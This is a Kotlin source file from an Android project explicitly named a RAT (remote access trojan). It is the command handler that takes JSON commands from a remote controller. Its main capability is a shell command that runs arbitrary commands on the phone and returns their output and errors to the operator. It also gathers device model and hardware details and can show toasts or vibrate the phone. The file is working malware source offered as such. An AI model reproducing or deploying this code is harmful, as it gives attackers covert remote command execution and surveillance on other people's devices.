package com.fox.rat

import android.content.Context
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.util.Log
import org.json.JSONObject

class CommandHandler(private val context: Context) {
    private val service = context as? RatService

    fun handle(commandJson: String) {
        try {
            val cmd = JSONObject(commandJson)
            val type = cmd.getString("type")
            val id = cmd.optString("id", "unknown")

            when (type) {
                "ping" -> respond(id, "pong", mapOf("status" to "alive"))
                "vibrate" -> handleVibrate(id, cmd)
                "shell" -> handleShell(id, cmd)
                "toast" -> handleToast(id, cmd)
                "info" -> handleInfo(id)
                else -> respond(id, "error", mapOf("msg" to "unknown command"))
            }
        } catch (e: Exception) {
            Log.e("RAT", "Command error: ${e.message}")
        }
    }

    private fun handleVibrate(id: String, cmd: JSONObject) {
        val duration = cmd.optLong("duration", 500)
        val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
            vm.defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            @Suppress("DEPRECATION")
            vibrator.vibrate(duration)
        }
        respond(id, "vibrate", mapOf("duration" to duration))
    }

    private fun handleShell(id: String, cmd: JSONObject) {
        val command = cmd.getString("command")
        try {
            val process = Runtime.getRuntime().exec(command)
            val output = process.inputStream.bufferedReader().readText()
            val error = process.errorStream.bufferedReader().readText()
            process.waitFor()

            respond(id, "shell", mapOf(
                "output" to output,
                "error" to error,
                "exitCode" to process.exitValue()
            ))
        } catch (e: Exception) {
            respond(id, "error", mapOf("msg" to e.message))
        }
    }

    private fun handleToast(id: String, cmd: JSONObject) {
        val message = cmd.getString("message")
        android.widget.Toast.makeText(context, message, android.widget.Toast.LENGTH_LONG).show()
        respond(id, "toast", mapOf("shown" to true))
    }

    private fun handleInfo(id: String) {
        val info = mapOf(
            "model" to Build.MODEL,
            "manufacturer" to Build.MANUFACTURER,
            "android" to Build.VERSION.RELEASE,
            "sdk" to Build.VERSION.SDK_INT,
            "product" to Build.PRODUCT,
            "hardware" to Build.HARDWARE
        )
        respond(id, "info", info)
    }

    private fun respond(id: String, type: String, data: Map<String, Any?>) {
        val response = mutableMapOf<String, Any?>(
            "id" to id,
            "type" to type,
            "timestamp" to System.currentTimeMillis()
        )
        response.putAll(data)
        service?.sendResponse(response)
    }
}
